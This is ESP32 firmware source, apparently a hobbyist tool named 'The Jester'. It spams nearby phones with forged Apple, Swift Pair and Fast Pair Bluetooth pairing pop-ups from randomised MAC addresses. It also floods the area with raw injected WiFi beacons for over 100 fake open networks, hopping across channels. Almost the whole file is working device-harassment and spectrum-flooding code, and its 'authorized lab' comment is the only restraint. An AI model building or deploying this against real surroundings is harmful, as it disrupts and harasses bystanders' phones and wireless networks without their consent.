// The Jester — pairing-popup / WiFi-beacon spammer (separate from the jammer).
//
// Two modes, toggled by the BOOT button (the device quick-reboots into the
// other mode — BLE and WiFi can't safely share the radio at once):
//   * BLE  : Apple / Swift Pair / Fast Pair pairing-popup spam (random MAC)
//   * WIFI : open-AP beacon flood with 100+ WiFi-pun SSIDs (no password)
//
// Uses the ESP32-S3's own radios — the nRF24 modules are NOT involved.
// Build/flash:  pio run -e ble_spam -t upload
//
// For authorized lab / classroom use.

#include <Arduino.h>
#include <Preferences.h>
#include <NimBLEDevice.h>
#include <WiFi.h>
#include "esp_wifi.h"

extern "C" int ble_hs_id_set_rnd(const uint8_t* rnd_addr);

namespace {
constexpr int8_t   kLedPin       = 48;   // onboard WS2812
constexpr uint8_t  kBootButton   = 0;    // BOOT, active low
constexpr uint32_t kAdvWindowMs  = 40;

enum SpamMode : uint8_t { MODE_BLE = 0, MODE_WIFI = 1 };
SpamMode gMode = MODE_BLE;
Preferences gPrefs;
uint32_t gTxErrors = 0;
int gLastTxErr = 0;

void setLed(uint8_t r, uint8_t g, uint8_t b) { neopixelWrite(kLedPin, r, g, b); }

// =========================================================================
//  WiFi-pun SSIDs — open networks, max 32 chars each.
// =========================================================================
const char* kSsids[] = {
    "Pretty Fly for a WiFi", "Wi Believe I Can Fi", "The LAN Before Time",
    "Bill Wi the Science Fi", "Drop It Like It's Hotspot", "Hide Yo Kids Hide Yo WiFi",
    "FBI Surveillance Van 4", "It Hurts When IP", "Wu Tang LAN", "Get Off My LAN",
    "Silence of the LANs", "Lord of the Pings", "The Promised LAN",
    "Winternet Is Coming", "Abraham Linksys", "Martin Router King",
    "John Wilkes Bluetooth", "House LANister", "Benjamin FrankLAN", "LAN Solo",
    "Obi-WAN Kenobi", "Darth Router", "The Force of WiFi", "Definitely Not WiFi",
    "No More Mr WiFi", "Click Here for Free WiFi", "Virus Distribution Center",
    "Loading...", "Searching...", "Connecting...", "Mom Use This One",
    "Mom Click Here", "Network Not Found", "Hidden Network", "Free Public WiFi",
    "Free WiFi You Wish", "Tell My WiFi Love Her", "Password Is Password",
    "Enter Password Here", "I Can Haz WiFi", "Area 51 Test Site",
    "NSA Listening Post 5", "CIA Surveillance", "404 Network Unavailable",
    "Untrusted Network", "Use at Your Own Risk", "Definitely a Trap",
    "Not a Honeypot", "Trust Me Im WiFi", "The Net Closes In", "WiFi Fie Fo Fum",
    "Spread Sheet", "Skynet Global Defense", "Skynet", "Pixel Wand",
    "Panic at the Cisco", "Router I Hardly Know Her", "Stop Broadcasting Kevin",
    "Kevin Stop Stealing WiFi", "Why Fi", "Bandwidth Bandits", "Nacho WiFi",
    "Pesto Change-o", "The Wireless Wonder", "WiFi Art Thou Romeo",
    "To WiFi or Not To WiFi", "Et Tu Bluetooth", "Game of Phones",
    "Breaking Bandwidth", "How I Met Your Router", "The Big Bang Modem",
    "Orange Is the New LAN", "Stranger Pings", "The Walking Net",
    "Better Call SaulNet", "Sons of Anarpacket", "Modem Family",
    "Curb Your Internet", "It's Always Sunny in WiFi", "Two and a Half Modems",
    "Arrested Development AP", "Rick and Modem", "Bob's Buffering",
    "Brooklyn Nine WiFi", "Saved by the Cell", "The WiFi of Wall Street",
    "WiFight the Power", "Buffering Forever", "404 WiFi Not Found",
    "Look Ma No Wires", "The Internet", "Guest Network", "Coffee Shop WiFi",
    "Hotel Lobby WiFi", "Airport Free WiFi", "City Free WiFi", "Community WiFi",
    "Neighborhood Watch WiFi", "WiFi So Serious", "Drop the Bass Not the WiFi",
    "LAN of the Free", "Home of the Beacon", "Practice Safe WiFi", "Pingu",
    "Ping Floyd", "Notorious B.I.G. Bytes", "Ctrl Alt Defeat",
    "Routy McRouterface", "Definitely the FBI", "Open Sesame",
    "Free Candy Van WiFi", "The Promised LAN 2", "WiFi of the Tiger",
    "Dunder MiffLAN", "Two Routers One Cup", "The LAN Down Under",
    "Gangnam Wireless Style", "404 Names Not Found", "I Pronounce You Connected",
};
constexpr size_t kSsidCount = sizeof(kSsids) / sizeof(kSsids[0]);

// 802.11 beacon header + fixed params (24 + 12 = 36 bytes); BSSID/SSID/channel
// are patched in per frame. Size is implicit so no stray bytes slip in before
// the SSID element.
uint8_t gBeacon[] = {
    0x80, 0x00, 0x00, 0x00,                          // beacon, duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,              // dst: broadcast
    0x02, 0xAB, 0xCD, 0xEF, 0x00, 0x00,              // src (BSSID) - patched
    0x02, 0xAB, 0xCD, 0xEF, 0x00, 0x00,              // BSSID       - patched
    0x00, 0x00,                                      // seq
    0x83, 0x51, 0xF7, 0x8F, 0x0F, 0x00, 0x00, 0x00,  // timestamp
    0x64, 0x00,                                      // beacon interval
    0x01, 0x04,                                      // capabilities (ESS, open)
};
const uint8_t kRates[] = {0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};

void sendBeacon(const char* ssid, uint8_t index, uint8_t channel) {
    uint8_t pkt[128];
    memcpy(pkt, gBeacon, sizeof(gBeacon));

    // Deterministic locally-administered BSSID per SSID so the APs look stable.
    pkt[15] = index;
    pkt[21] = index;

    uint8_t ssidLen = static_cast<uint8_t>(strlen(ssid));
    if (ssidLen > 32) ssidLen = 32;

    uint8_t p = sizeof(gBeacon);
    pkt[p++] = 0x00;                 // SSID tag
    pkt[p++] = ssidLen;
    memcpy(pkt + p, ssid, ssidLen);  p += ssidLen;
    memcpy(pkt + p, kRates, sizeof(kRates));  p += sizeof(kRates);
    pkt[p++] = 0x03; pkt[p++] = 0x01; pkt[p++] = channel;  // DS param (channel)

    const esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, p, false);
    if (e != ESP_OK) {
        ++gTxErrors;
        gLastTxErr = e;
    }
}

void initWifi() {
    // AP mode with a real (hidden) softAP brings the AP interface fully up so
    // esp_wifi_80211_tx(WIFI_IF_AP, ...) is accepted — STA-mode injection is
    // rejected on current ESP-IDF.
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP("jester-base", nullptr, 1, 1 /*hidden*/);
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[WIFI] Beacon flood: %u open SSIDs, hopping CH1/6/11.\n", (unsigned)kSsidCount);
}

void runWifi() {
    static const uint8_t hop[] = {1, 6, 11};
    static uint8_t hi = 0;
    static uint8_t hue = 0;

    const uint8_t ch = hop[hi];
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    for (size_t i = 0; i < kSsidCount; ++i) {
        sendBeacon(kSsids[i], static_cast<uint8_t>(i), ch);
        delay(1);  // pace so the WiFi TX queue drains (avoids ESP_ERR_NO_MEM)
    }
    hi = (hi + 1) % sizeof(hop);

    static uint32_t lastReport = 0;
    if (millis() - lastReport > 2000) {
        lastReport = millis();
        Serial.printf("[WIFI] CH%u, %u SSIDs/pass, tx errors: %u (last err 0x%X)\n",
            ch, (unsigned)kSsidCount, gTxErrors, gLastTxErr);
    }

    // amber-ish rotating glow = WiFi beacon spam active
    hue += 9;
    setLed(120, static_cast<uint8_t>(40 + (hue & 0x3F)), 0);
}

// =========================================================================
//  BLE pairing-popup spam (Apple / Swift Pair / Fast Pair)
// =========================================================================
NimBLEAdvertising* gAdvertising = nullptr;

const uint8_t kAppleModels[][2] = {
    {0x0E, 0x20}, {0x0A, 0x20}, {0x0F, 0x20}, {0x13, 0x20}, {0x14, 0x20},
    {0x02, 0x20}, {0x0B, 0x20}, {0x0C, 0x20}, {0x11, 0x20}, {0x16, 0x20},
    {0x17, 0x20}, {0x12, 0x20}, {0x0D, 0x20},
};
const uint8_t kFastPairModels[][3] = {
    {0xCD, 0x82, 0x56}, {0x0E, 0x86, 0x6F}, {0x92, 0xBB, 0xBD},
    {0x2D, 0x7A, 0x23}, {0x82, 0x1F, 0x66},
};
const char* kSwiftPairNames[] = {
    "Jester-01", "Free-AirPods", "Pair-Me", "Mouse-9000", "Keyboard-X",
};

void freshRandomAddress() {
    uint8_t addr[6];
    for (uint8_t i = 0; i < 6; ++i) addr[i] = static_cast<uint8_t>(esp_random() & 0xFF);
    addr[5] |= 0xC0;  // static random
    ble_hs_id_set_rnd(addr);
}

void advertiseRaw(uint8_t* payload, size_t len) {
    gAdvertising->stop();
    freshRandomAddress();
    NimBLEAdvertisementData advData;
    advData.addData(reinterpret_cast<char*>(payload), len);
    gAdvertising->setAdvertisementData(advData);
    gAdvertising->start();
    delay(kAdvWindowMs);
    gAdvertising->stop();
}

void spamApple() {
    const uint8_t* model = kAppleModels[esp_random() % (sizeof(kAppleModels) / 2)];
    uint8_t p[31];
    uint8_t i = 0;
    p[i++] = 0x1E; p[i++] = 0xFF; p[i++] = 0x4C; p[i++] = 0x00;
    p[i++] = 0x07; p[i++] = 0x19; p[i++] = 0x07;
    p[i++] = model[0]; p[i++] = model[1]; p[i++] = 0x55;
    while (i < sizeof(p)) p[i++] = static_cast<uint8_t>(esp_random() & 0xFF);
    advertiseRaw(p, sizeof(p));
    setLed(40, 40, 40);
}

void spamSwiftPair() {
    const char* name = kSwiftPairNames[esp_random() % (sizeof(kSwiftPairNames) / sizeof(kSwiftPairNames[0]))];
    const uint8_t nameLen = static_cast<uint8_t>(strlen(name));
    uint8_t p[32];
    uint8_t i = 0;
    p[i++] = static_cast<uint8_t>(6 + nameLen);
    p[i++] = 0xFF; p[i++] = 0x06; p[i++] = 0x00;
    p[i++] = 0x03; p[i++] = 0x00; p[i++] = 0x80;
    for (uint8_t n = 0; n < nameLen; ++n) p[i++] = static_cast<uint8_t>(name[n]);
    advertiseRaw(p, i);
    setLed(0, 0, 60);
}

void spamFastPair() {
    const uint8_t* model = kFastPairModels[esp_random() % (sizeof(kFastPairModels) / 3)];
    uint8_t p[10];
    uint8_t i = 0;
    p[i++] = 0x02; p[i++] = 0x01; p[i++] = 0x06;
    p[i++] = 0x06; p[i++] = 0x16; p[i++] = 0x2C; p[i++] = 0xFE;
    p[i++] = model[0]; p[i++] = model[1]; p[i++] = model[2];
    advertiseRaw(p, i);
    setLed(0, 60, 0);
}

void initBle() {
    NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    gAdvertising = NimBLEDevice::getAdvertising();
    gAdvertising->setScanResponse(false);
    Serial.println("[BLE] Spamming Apple / Swift Pair / Fast Pair. Random MAC per advert.");
}

void runBle() {
    switch (esp_random() % 3) {
        case 0: spamApple();     break;
        case 1: spamSwiftPair(); break;
        default: spamFastPair(); break;
    }
}

// =========================================================================
//  BOOT button: flip stored mode and quick-reboot into the other.
// =========================================================================
void checkButton() {
    static bool lastHigh = true;
    static uint32_t lastEdge = 0;
    const bool high = digitalRead(kBootButton) == HIGH;
    if (lastHigh && !high && (millis() - lastEdge) > 250) {
        lastEdge = millis();
        const uint8_t next = (gMode == MODE_BLE) ? MODE_WIFI : MODE_BLE;
        gPrefs.begin("spam", false);
        gPrefs.putUChar("mode", next);
        gPrefs.end();
        Serial.printf("[BTN] switching to %s, rebooting...\n", next == MODE_WIFI ? "WIFI" : "BLE");
        setLed(60, 0, 0);
        delay(60);
        ESP.restart();
    }
    lastHigh = high;
}
}  // namespace

void setup() {
    Serial.begin(921600);
    delay(800);
    pinMode(kBootButton, INPUT_PULLUP);
    setLed(60, 0, 60);  // purple during init

    gPrefs.begin("spam", true);
    gMode = static_cast<SpamMode>(gPrefs.getUChar("mode", MODE_BLE));
    gPrefs.end();
    gMode = MODE_WIFI;  // TEMP: force WiFi for injection verification

    Serial.printf("\n\n===== THE JESTER / SPAMMER (%s) =====\n", gMode == MODE_WIFI ? "WIFI" : "BLE");
    Serial.println("[BTN] Press BOOT to switch BLE <-> WiFi spam.");

    if (gMode == MODE_WIFI) {
        initWifi();
    } else {
        initBle();
    }
}

void loop() {
    checkButton();
    if (gMode == MODE_WIFI) {
        runWifi();
    } else {
        runBle();
    }
}
